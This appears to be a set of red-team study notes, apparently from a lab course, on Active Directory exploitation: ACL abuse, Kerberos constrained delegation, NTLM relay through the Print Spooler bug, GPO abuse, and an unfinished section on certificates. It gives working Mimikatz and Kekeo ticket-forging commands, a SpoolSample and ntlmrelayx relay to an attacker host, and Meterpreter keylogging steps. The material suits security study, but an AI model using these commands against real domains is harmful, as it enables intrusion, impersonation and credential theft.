Having [[Breaching AD|breached]] into and [[Enumerating AD|enumerated]] an AD environment, another step that goes hand in hand with [[Lateral Movement and Pivoting|lateral movement]] is AD exploitation. Once we have performed our [[Red Recon|recon]] and understand the [[Living Off The Land|lay of the land]], we can proceed to the exploitation phase, using different misconfigurations to perform a combination of lateral movement and privilege escalation until we reach a suitable position to [[Credential Harvesting Active Directory|execute our goals]]. This phase is usually combined with [[Persistence Active Directorty|persistence]] to ensure that we can't lose the new position we gain. And of course we need to start from the enumeration step to acquire any new information that may be available from our new position.

# Permission Delegation
AD can delegate permissions and privileges through a feature called **Permission Delegation** (Not to be confused with Kerberos Delegation). One of the features that makes AD so popular, it lets users aside from those with DA credentials to carry tasks that have a certain degree of privilege by having those privileges delegated from the DA. Now of course, this has to follow the principle of Least privilege, but in large organizations that is more of a dream than a reality.

---

Permission Delegation exploits are often referred to as **ACL-based attacks**. AD allows administrators to configure **Access Control Entries** (ACEs) that populates **Discretionary Access Control Lists** (DACLs). Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that nay other AD object has against the target object.
However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. For example if the IT support team were granted the `ForceChangePassword` ACE over the Domain Users group, this would be consider insecure. This is because they would have the ability to reset the passwords of employees, but they would also be able to reset the passwords of privileged accounts, such as the accounts that are members of the Domain Admins group essentially allowing for privilege escalation.

## Exploiting ACEs
A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited. Some of the most notable ones are:
- `ForceChangePassword`: We have the ability to set the user's current password without knowing their current password.
- `AddMembers`: We have the ability to add users (including our own account), groups or computers to the target group.
- `GenericAll`: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- `GenericWrite`: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- `WriteOwner`: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- `WriteDACL`: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- `AllExtendedRights`: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the  [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) PowerShell cmdlets or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit). Depending on the breach and the detection tools in the environment, one option may be stealthier. 

Note that updating permissions, can take a while to propagate through the domain, so we won't be able to act immediately upon joining a new group or something like that.

# Kerberos Delegation
Now, when talking about AD delegation, this is usually what is being discussed, rather than Permission Delegation.
The practical use of Kerberos delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs access to a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.
However, we can allow this service to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.

## Constrained vs Unconstrained
There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method. In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the `TRUSTED_FOR_DELEGATION` flag set authenticates to a host with Unconstrained Delegation configured, a TGT for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. [Example](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976).

---


To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. Some services that can be configured for delegation are:
- HTTP - Used for Web apps to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the delegated account can't just be used for everything. However, it can still be used for some exploitation. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash, we could generate a TGT for this account, then use the TGT to execute a TGS request for any non-sensitive user account in order to access the services as that user. 

## Resource-Based Constrained Delegation
The third type of Kerberos Delegation, introduced in 2012, **Resource-Based Constrained Delegation** (RBCD) provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For a web app, for example, this means that instead of specifying that the web service account can delegate to the database service to access the database, we can now specify that on the database service that the web service account is allowed to delegate access to it.
If we have permissions configure RBCD for a service. This means we have the ability to set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for the AD object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. [Example](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/).

## Constrained Delegation Exploitation
As an example, to exploit Constrained Delegation, we first need to enumerate available delegations. We can use the `Get-NetUser` cmdlet of [[Powerview|PowerSploit]] for this enumeration by running the following:
```powershell
Import-Module PowerView.ps1
Get-NetUser -TrustedToAuth
```
Based on the output of this command, we may find an account that can delegate the HTTP and WSMAN services on a server machine. Normally we may think that this only means that we can access websites on behalf of impersonated users. However, Powershell Remoting uses the HTTP and WSMAN services as well.
We can then use [[Mimikatz]] to dump LSASecrets, part of the Windows Registry Hive where the credentials for features such as Windows services are stored. 
```mimikatz
toke::elevate
lsadump::secrets
```
This will show us the clear text credentials, which we can use to perform a Kerberos Delegation attack. For this we will use both [[Kekeo]] and [[Mimikatz]] (We can also use [[Rubeus]] to generate the tickets instead of Kekeo). We need to exit out of mimikatz so the `token::elevate` isn't active and we can load the tickets in the correct context. We will be opening Kekeo, inside the user machine and using it to generate our tickets and then use Mimikatz to load those tickets into memory.

First we need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services
```kekeo
tgt::ask /user:svcUser /domain:za.domain.com /password:Pass123
```
Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on the server.
```kekeo
tgs::s4u /tgt:TGT_svc...DOMAIN.COM.kirbi /user:t1_john.smith /service:http/server.za.domain.com
```
In here we first provide the TGT that we generated in the previous step (`/tgt`), then the user we want to impersonate (`/user`) and finally the service we want to impersonate using delegation (`/service`). We first generate a TGS for the HTTP service, then we can rerun the same for the WSMAN service.
Now that we have the two TGS tickets, we can use [[Mimikatz]] to import them.
```mimikatz
privilege::debug
kerberos::ptt TGS_t1_john.smith...COM_http~...DOMAIN.COM.kirbi
kerberos::ptt TGS_t1_john.smith...COM_wsman~...DOMAIN.COM.kirbi
```
Once done, we can exit mimikatz and run `klist` to verify if it worked. Now that the tickets are imported, we can create our PSSession on the server
```powershell
New-PSSession -ComputerName server.za.domain.com
Enter-PSSession -ComputerName server.za.domain.com
```

# Automated Relays
Authentication attempts are constantly flying across the network, and as we have seen in [[Breaching AD#Intercepting NetNTLM Challenge|Breaching AD]], if we have luck, we can intercept some of these challenges from a rogue device to breach into the AD environment. But waiting is not always an option, in that case we can try to force an authentication to occur.

## Machine Accounts
All Windows hosts have a machine account. Normally these accounts are untouchable, the passwords are 120 characters (UTF16) long and are rotated every 30 days. 
In an AD environment, these accounts can be used for different services. Different DCs use their machines accounts to synchronise AD updates and changes. When we request a certificate on behalf of the host we are working on, the machine account of that host is used for authentication to the AD Certificate Service.
But there are some cases where one machine has admin rights over another machine. Again, normally pretty normal, it is an expected functionality for DCs or SQL clusters that must be synchronised. However, these instances can provide an attack vector for forcing authentication.

---

We first need to identify cases where a machine account has administrative access over another machine. We can use [[Bloodhound]] for this, under "Raw Query" we can search for all the computers that belong to a group that has admin rights to another computer
```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```
Finding something like
![[Pasted image 20250220124910.png]]

## MS-RPRN ([PrinterBug](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn))
The **Print System Remote Protocol** ([MS-RPRN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/a7cceedb-3afc-45f0-82e1-af2b2cbf20e4) (Shit acronym btw)) based on the **Remote Procedure Call** ([MS-RPCE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15)) protocol "supports synchronous printing and spooling operations between a client and a server." The problem here relies in the fact that an attacker controlling a domain user/computer can trigger the Print Spooler service of a target running it and make it authenticate to an arbitrary IP address. 
Labeled as "won't fix", it is enabled by default on all Windows environments. Thus the only things that we need to exploit this, apart from a machine account with administrative privileges, is the following:
- A valid set of AD account creds
- Network connectivity to the target's SMB service
- The target host must be running the Print Spooler service
- The hosts must not have SMB signing enforced
The first two, will usually serve themselves, so we only need to focus on the latter two.

### Print Spooler Service
To determine if the Print Spooler service is running we need to query from the network perspective. For example, we could use a WMI query from an SSH session from another machine on the network.
```powershell
GWMI Win32_Printer -Computer server2.za.domain.com
```
If we were to get an access denied error, we could also attempt
```powershell
Get-PrinterPort -ComputerName server2.za.domain.com
```
Tho, it being a common vulnerability, MS has been protecting viewing these ports from the network perspective, so both may give us an error even tho the service is up and running, so we could try it either way.

### SMB Signing
In order to relay the forced authentication attempt, SMB signing should not be enforced. Note here that there is a difference between it being **allowed** and it being **enforced**. Since some legacy systems don't support SMB signing, by default, the configuration of SMB is that signing is allowed but not enforced, so it will only be used if supported. Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing the target not to sign the SMB authentication attempt.
To verify that the servers don't have SMB signing enforced, we can use [[Nmap]] from our attack machine.
```sh
nmap --script:smb2-security-mode -p445 server1.za.domain.com server2.za.domain.com
```

## Exploitation
Note that this attack can be unstable. Abusing the Print Spooler service may cause it to crash, so a callback is not guaranteed. 

Now, to exploit the authentication relay, we can use [SpoolSample](https://github.com/leechristensen/SpoolSample), but there are others like [Spooler](), [PetitPotam]() or [PrintNightmare](). We will use it to force the server2 to authenticate to us and then use [Impacket's](https://github.com/SecureAuthCorp/impacket) [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the authentication attempt server1.

The first step is to set up the NTLM relay. We can use
```sh
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"server1 IP" -debug
```
If we specify the hostname of the server instead of the IP, the host could request that we use Kerberos authentication instead of NTLM. 
Now, we can force server2 to authenticate to us. In an SSH terminal on a machine inside the domain we can do the following
```powershell
SpoolSample.exe server2.za.tryhackme.com "Attacker IP"
```
If all goes well, we should receive an authentication attempt and a relay to server1. We can also specify a command to run, inside the `ntlmrelayx.py` with the `-c` flag, but by not specifying a command, we should have performed a hashdump that we can use to get a shell on the host.
 
# AD Users
Although we may already have an account with administrative privileges of some part of the AD environment, we can go even further. It is always best to try and reach the best position for goal execution. Thus we are going to target AD users.

## Users and User Behavior
Users are the weakest link in the security chain, everything from weak passwords, bad habits to granting unnecessary permissions. It would be a great oversight to just ignore this attack surface. 

While it is preferable to build proper enumeration and an attack methodology, we will only focus on:
- **Credential Management** - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them is a nuisance.
- **Keylogging** - Often, during exploitation, we need to understand how normal users interact with a system. Along with screengrabs, keylogging can be a useful tool to gain this understanding.

## Hunting for Credentials
Once we have compromised a machine, we should look around to see if there is any useful information. Having a look at the user directories like Desktop, Documents, or Downloads, among others to see if there is any information on any of them.
We may find things like credentials on notes, password managers, or even `.kdbx` files. We may be lucky enough to find them without a password or with very weak encryption, but normally anyone careful enough to use a password database is going to be cautious enough to make sure their initial password is secure. So instead of trying to crack it we are going to listen.

---

[[Metasploit|Meterpreter]] has a built-in keylogger, and although this is useful, we normally would be running in the context of SYSTEM, and SYSTEM won't be typing much. So, to capture the correct user's credentials, we will need to ensure that our shell is running the context of that user.
Thankfully, Meterpreter provides a migrate feature, and since we are running as SYSTEM we should be able to migrate to any process. 
Inside meterpreter, the first step is to see if the user has any running processes on the machine.
```meterpreter
ps | grep "Username"
```
Here we are looking for the PID of the process that we want to migrate to. Once we have found a suitable one, we simply use
```meterpreter
migrate 3612
```
And presto, we can confirm that we are running the context of our target using
```meterpreter
getuid
```
Now, we can start our keylogger with
```meterpreter
keyscan_start
```
Now, we simply wait and hope that we capture something good. After a while, we can dump the keystrokes with
```meterpreter
keyscan_dump
```

# GPOs
A GPO is a virtual collection of policy settings, they are stored in the SYSVOL directory to be replicated to domain-joined machines. Each GPO has a unique GUID, that's why if we try to read the contents of the SYSVOL directory, it won't make a much sense with all the random names.
Each Windows computer has a Local Policy Configuration which contains a lot of different configurations, some of the most notable ones among them are:
- Application configurations for services such as Firewalls, AVs and Applocker.
- Local Group memberships such as Administrator or Remote Desktop Users groups.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.
As said, these are just some examples, but there a lot of other configurations that can be set.

## GPM
**Group Policy Management** (GPM) serves a way to deploy a configuration from a central location in a organization. Instead of defining policies locally on each machine, GPM allows us to define policies directly on the AD structure. Meaning that we can define GPOs for AD objects, such as a specific OU or group.
Domain-joined computers would then pull all policies from SYSVOL periodically and apply the relevant ones. By default, policies are replicated every 15 minutes through the gpupdate application. **But** we can manually execute this application from cmd to apply policies instantly.

## Exploiting GPOs
As always, there are several way to do this, depending on the specific situation we may require one or other technique. For this we will be working under the following environment
![[Pasted image 20250224113234.png]]
In this case, we can see that we have write rights to a GPO which delegate to a group which contains server2 which will be our target. We will add an AD account we control to both the local Administrators and local Remote Desktop Users groups, allowing us administrative privileges on server2 and the ability to RDP in.
To modify the GPO we need to access GPM as the user that has the permissions. To do this we can start the Microsoft Management Control (MMC) through the cmd from the context of the privileged user
```cmd
mmc
```
Then we will need to add the Group Policy Management snap-in:
1. File > Add/Remove Snap-in
2. Group Policy Management > Add
3. Ok
Now, we should be able to see GPOs for the domain.

Then navigate to the GPO we have permission to modify

We can right-click on the GPO and edit it to add an account to the local groups:
1. Computer Configuration > Policies > Windows Settings > Security Settings
2. Right-click on **Restricted Groups** and **Add Group**
3. Click **Browse**, Enter the name of the account (IT Support in this case) and click **Check Names**
4. **Ok** > **Ok**
5. Finally we say that this group is a member of both the **Administrators** and **Remote Desktop Users** group
6. **Apply** > **Ok**
Now, all we need is to wait for the policy to update or update it ourselves. After this, any account that is a member of the **IT Support** group will now have administrative and RDP permission on server2

# Certificates
[Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2) showed that it was possible to exploit misconfigured certificate template for Privesc and lateral movement.
## AD CS
AD **Certificate Services** (CS) is Microsoft's **Public Key Infrastructure** (PKI) [implementation](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview). Since AD provides a level of trust in an org, it can be used as a **Certificate Authority** (CA) to prove and delegate trust. AD CS is used from things like encrypting file systems and creating/verifying digital signatures, to things like user authentications. Making it a pretty interesting attack vector.
Since AD CS is a privileged function, it normally runs on a limited selection of DCs, so normal users can't interact with the service directly. On the upside, organizations tend to be too large to have one administrator create and distribute each certificate manually, this is where **Certificate Templates** come in. Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request the certificate themselves, these templates have parameters that say which user can request the certificate and what is required. Authors of [Paper](https://posts.specterops.io/certified-pre-owned-d95910965cd2) found that some combinations of these parameters can be abused for Privesc and persistency.

## Vulnerable Templates
To find vulnerable templates, we will use `certutil`



# Domain Trusts


